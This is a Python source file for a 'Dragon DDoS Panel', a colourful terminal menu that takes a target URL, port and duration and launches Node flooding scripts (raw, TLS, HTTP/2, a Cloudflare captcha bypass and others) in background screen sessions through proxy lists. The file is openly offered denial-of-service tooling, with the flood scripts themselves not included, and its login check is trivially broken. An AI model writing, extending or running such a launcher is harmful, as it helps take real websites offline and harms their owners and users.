import socket
import os
import requests
import random
import getpass
import time
import sys
from pystyle import Colors, Colorate

os.system("python3 scrape.py");

username = "Administrator"
Role = "Owner"

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def si():
    print(Colorate.Diagonal(Colors.yellow_to_red, f"𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐃𝐫𝐚𝐠𝐨𝐧 𝐃𝐃𝐨𝐒 𝐏𝐚𝐧𝐞𝐥 | 𝐔𝐬𝐞𝐫: {username} | 𝐑𝐨𝐥𝐞: {Role} | 𝐇𝐚𝐩𝐩𝐲 𝐓𝐨 𝐔𝐬𝐞"))
    print("")
  
def Methods():
    clear()
    si()
    print(Colorate.Diagonal(Colors.yellow_to_red, ''' 
            𝐇𝐞𝐫𝐞 𝐢𝐬 𝐭𝐡𝐞 𝐋𝐢𝐬𝐭 𝐨𝐟 𝐀𝐥𝐥 𝐌𝐞𝐭𝐡𝐨𝐝𝐬
            
× BROWSER - Bypass Cloudflare Captcha
× RAW - Good For UAM Website
x HTTP-BOKEP - Good For Little Website
× TLS - Good For Unprotected Website
× HTTPSV2 - Use http/2 
× WIZARD - Good For Unprotected Website And Support http2/http/1
× HTTPSV1 - Use http/1 for attack http:// website ( only http:// )

HOW TO USE
RAW https://example.com 443 120         METHOD PORT TIME
'''))

def menu():
    clear()
    print(Colorate.Diagonal(Colors.yellow_to_red, f"𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐃𝐫𝐚𝐠𝐨𝐧 𝐃𝐃𝐨𝐒 𝐏𝐚𝐧𝐞𝐥 | 𝐔𝐬𝐞𝐫: {username} | 𝐑𝐨𝐥𝐞: {Role} | 𝐇𝐚𝐩𝐩𝐲 𝐓𝐨 𝐔𝐬𝐞"))
    print("")
    banner = '''
        ⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⣤⡼⠀⢀⡀⣀⢱⡄⡀⠀⠀⠀⢲⣤⣤⣤⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⡿⠛⠋⠁⣤⣿⣿⣿⣧⣷⠀⠀⠘⠉⠛⢻⣷⣿⣽⣿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣞⣽⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠠⣿⣿⡟⢻⣿⣿⣇⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣟⢦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣿⡾⣿⣿⣿⣿⣿⠿⣻⣿⣿⡀⠀⠀⠀⢻⣿⣷⡀⠻⣧⣿⠆⠀⠀⠀⠀⣿⣿⣿⡻⣿⣿⣿⣿⣿⠿⣽⣦⡀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⠟⣩⣾⣿⣿⣿⢟⣵⣾⣿⣿⣿⣧⠀⠀⠀⠈⠿⣿⣿⣷⣈⠁⠀⠀⠀⠀⣰⣿⣿⣿⣿⣮⣟⢯⣿⣿⣷⣬⡻⣷⡄⠀⠀⠀
⠀⠀⢀⡜⣡⣾⣿⢿⣿⣿⣿⣿⣿⢟⣵⣿⣿⣿⣷⣄⠀⣰⣿⣿⣿⣿⣿⣷⣄⠀⢀⣼⣿⣿⣿⣷⡹⣿⣿⣿⣿⣿⣿⢿⣿⣮⡳⡄⠀⠀
⠀⢠⢟⣿⡿⠋⣠⣾⢿⣿⣿⠟⢃⣾⢟⣿⢿⣿⣿⣿⣾⡿⠟⠻⣿⣻⣿⣏⠻⣿⣾⣿⣿⣿⣿⡛⣿⡌⠻⣿⣿⡿⣿⣦⡙⢿⣿⡝⣆⠀
⠀⢯⣿⠏⣠⠞⠋⠀⣠⡿⠋⢀⣿⠁⢸⡏⣿⠿⣿⣿⠃⢠⣴⣾⣿⣿⣿⡟⠀⠘⢹⣿⠟⣿⣾⣷⠈⣿⡄⠘⢿⣦⠀⠈⠻⣆⠙⣿⣜⠆
⢀⣿⠃⡴⠃⢀⡠⠞⠋⠀⠀⠼⠋⠀⠸⡇⠻⠀⠈⠃⠀⣧⢋⣼⣿⣿⣿⣷⣆⠀⠈⠁⠀⠟⠁⡟⠀⠈⠻⠀⠀⠉⠳⢦⡀⠈⢣⠈⢿⡄
⣸⠇⢠⣷⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⠋⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢾⣆⠈⣷
⡟⠀⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣤⡀⢸⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⢹
⡇⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠈⣿⣼⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⢸
⢡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠶⣶⡟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼
⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡁⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣼⣀⣠⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

Type Methods Yo See All Method⠀⠀⠀⠀⠀  
'''
    print(Colorate.Diagonal(Colors.yellow_to_red, banner))
def main():
    menu()
    while(True):
        cnc = input(Colorate.Diagonal(Colors.yellow_to_red, f"{username}@DragonC2#~"))
        if cnc == "Methods" or cnc == "Method" or cnc == "methods" or cnc == "l7":
            Methods()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            clear()

        elif "RAW" in cnc:
            try: 
                host = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system("clear");
                print(Colorate.Diagonal(Colors.yellow_to_red, f'''
                 ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
                 ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║┤ ║║║ ║
                 ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩
         ╚═══════╦══════════════════════════════╦════════╝
       ╔═════════╩══════════════════════════════╩══════════╗
                <>Target     • [ {host} ]
                <>Port       • [ {port} ]
                <>Duration   • [ {time} ]
       ╚═════════╦═══════════════════════════════╦═════════╝
         ╔═══════╩═══════════════════════════════╩═══════╗
                <>Credits  •  [ Zxkys ]
         ╚═══════════════════════════════════════════════╝
         
         Press CTRL+C To Stop
                '''))
                os.system(f'screen -dm timeout {time} node raw.js {host} {time} 30 10 proxy.txt')
            except IndexError:
                print(Colorate.Diagonal(Colors.yellow_to_red, 'Usage: METHOD URL PORT TIME'));
                print(Colorate.Diagonal(Colors.yellow_to_red, 'Example: METHOD URL PORT TIME'));
                
        elif "TLS" in cnc:
            try: 
                host = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system("clear");
                print(Colorate.Diagonal(Colors.yellow_to_red, f'''
                 ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
                 ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║┤ ║║║ ║
                 ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩
         ╚═══════╦══════════════════════════════╦════════╝
       ╔═════════╩══════════════════════════════╩══════════╗
                <>Target     • [ {host} ]
                <>Port       • [ {port} ]
                <>Duration   • [ {time} ]
       ╚═════════╦═══════════════════════════════╦═════════╝
         ╔═══════╩═══════════════════════════════╩═══════╗
                <>Credits  •  [ Zxkys ]
         ╚═══════════════════════════════════════════════╝
         
         Press CTRL+C To Stop
                '''))
                os.system(f'screen -dm timeout {time} node tls.js {host} {time} 30 10 proxy.txt')
            except IndexError:
                print(Colorate.Diagonal(Colors.yellow_to_red, 'Usage: METHOD URL PORT TIME'));
                print(Colorate.Diagonal(Colors.yellow_to_red, 'Example: METHOD URL PORT TIME'));

        elif "BROWSER" in cnc:
            try:
                host = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system("clear");
                print(Colorate.Diagonal(Colors.yellow_to_red, f'''
                 ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
                 ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║┤ ║║║ ║
                 ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩
         ╚═══════╦══════════════════════════════╦════════╝
       ╔═════════╩══════════════════════════════╩══════════╗
                <>Target     • [ {host} ]
                <>Port       • [ {port} ]
                <>Duration   • [ {time} ]
       ╚═════════╦═══════════════════════════════╦═════════╝
         ╔═══════╩═══════════════════════════════╩═══════╗
                <>Credits  •  [ Zxkys ]
         ╚═══════════════════════════════════════════════╝

         Press CTRL+C To Stop
                '''))
                os.system(f'screen -dm timeout {time} node browser.js {host} 1 prem.txt 1 {time}')
            except IndexError:
                print(Colorate.Diagonal(Colors.yellow_to_red, 'Usage: METHOD URL PORT TIME'));
                print(Colorate.Diagonal(Colors.yellow_to_red, 'Example: METHOD URL PORT TIME'));
                
        elif "HTTPSV2" in cnc:
            try: 
                host = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system("clear");
                print(Colorate.Diagonal(Colors.yellow_to_red, f'''
                 ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
                 ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║┤ ║║║ ║
                 ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩
         ╚═══════╦══════════════════════════════╦════════╝
       ╔═════════╩══════════════════════════════╩══════════╗
                <>Target     • [ {host} ]
                <>Port       • [ {port} ]
                <>Duration   • [ {time} ]
       ╚═════════╦═══════════════════════════════╦═════════╝
         ╔═══════╩═══════════════════════════════╩═══════╗
                <>Credits  •  [ Zxkys ]
         ╚═══════════════════════════════════════════════╝
         
         Press CTRL+C To Stop
                '''))
                os.system(f'screen -dm timeout {time} node httpsv2.js {host} 15 {time}')
            except IndexError:
                print(Colorate.Diagonal(Colors.yellow_to_red, 'Usage: METHOD URL PORT TIME'));
                print(Colorate.Diagonal(Colors.yellow_to_red, 'Example: METHOD URL PORT TIME'));  
                
        elif "WIZARD" in cnc:
            try: 
                host = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system("clear");
                os.system(f'screen -dm timeout {time} node wizard.js {host} {time} 30 10 proxy.txt')
            except IndexError:
                print(Colorate.Diagonal(Colors.yellow_to_red, 'Usage: METHOD URL PORT TIME'));
                print(Colorate.Diagonal(Colors.yellow_to_red, 'Example: METHOD URL PORT TIME'));             
                
        elif "HTTP-BOKEP" in cnc:
            try: 
                host = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system("clear");
                os.system(f'screen -dm timeout {time} node HTTP-BOKEP.js GET {host} {time} 10 30 proxy.txt --query 2 --delay 1 --referer rand')
            except IndexError:
                print(Colorate.Diagonal(Colors.yellow_to_red, 'Usage: METHOD URL PORT TIME'));
                print(Colorate.Diagonal(Colors.yellow_to_red, 'Example: METHOD URL PORT TIME'));             
                
        elif "HTTPSV1" in cnc:
            try: 
                host = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system("clear");
                print(Colorate.Diagonal(Colors.yellow_to_red, f'''
                 ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
                 ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║┤ ║║║ ║
                 ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩
         ╚═══════╦══════════════════════════════╦════════╝
       ╔═════════╩══════════════════════════════╩══════════╗
                <>Target     • [ {host} ]
                <>Port       • [ {port} ]
                <>Duration   • [ {time} ]
       ╚═════════╦═══════════════════════════════╦═════════╝
         ╔═══════╩═══════════════════════════════╩═══════╗
                <>Credits  •  [ Zxkys ]
         ╚═══════════════════════════════════════════════╝
         
         Press CTRL+C To Stop
                '''))
                os.system(f'screen -dm timeout {time} node http1.js {host} {time}')
            except IndexError:
                print(Colorate.Diagonal(Colors.yellow_to_red, 'Usage: METHOD URL PORT TIME'));
                print(Colorate.Diagonal(Colors.yellow_to_red, 'Example: METHOD URL PORT TIME'));
                

        elif "help" in cnc:
            print(Colorate.Diagonal(Colors.yellow_to_red, ''' 
𝐋𝐀𝐘𝐄𝐑𝟕 - 𝐒𝐄𝐄 𝐀𝐋𝐋 𝐋𝐀𝐘𝐄𝐑𝟕 𝐌𝐄𝐓𝐇𝐎𝐃 
𝐇𝐄𝐋𝐏 - 𝐅𝐎𝐑 𝐇𝐄𝐋𝐏 
𝐂𝐋𝐄𝐀𝐑 - 𝐂𝐋𝐄𝐀𝐑 𝐓𝐄𝐑𝐌𝐈𝐍𝐀𝐋
'''))
        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass


def login():
    clear()
    username = input("</> Username: ")
    password = getpass.getpass(prompt='</> Password: ')
    if username != username or password != username:
        print("")
        print("Password/Username Salah")        
        sys.exit(1)
    elif username == username and password == username:
        print("Welcome To Dragon DDoS Panel")
        time.sleep(0.3)
        main()
login()
